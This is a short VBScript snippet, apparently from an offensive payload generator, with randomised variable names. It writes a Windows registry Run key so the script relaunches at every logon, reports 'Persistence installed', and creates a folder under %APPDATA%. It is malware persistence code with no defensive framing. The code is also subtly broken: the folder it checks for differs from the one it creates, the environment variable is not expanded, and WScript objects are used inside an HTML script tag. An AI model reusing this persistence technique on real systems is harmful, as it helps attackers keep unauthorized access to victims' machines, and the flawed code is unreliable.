<script language="VBScript">
	Dim var_RENjIUqO, var_gFqll
	Set var_RENjIUqO = CreateObject("WScript.Shell")
	var_gFqll = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\hpLuMgDf"
	var_RENjIUqO.RegWrite var_gFqll, "wscript.exe " & WScript.ScriptFullName, "REG_SZ"
	WScript.Echo "Persistence installed at " & var_gFqll
	Dim var_TjID
	Set var_TjID = CreateObject("Scripting.FileSystemObject")
	If Not var_TjID.FolderExists("%APPDATA%\\oCugHt") Then
		var_TjID.CreateFolder(var_RENjIUqO.ExpandEnvironmentStrings("%APPDATA%\\aeDlLa"))
	End If
</script>
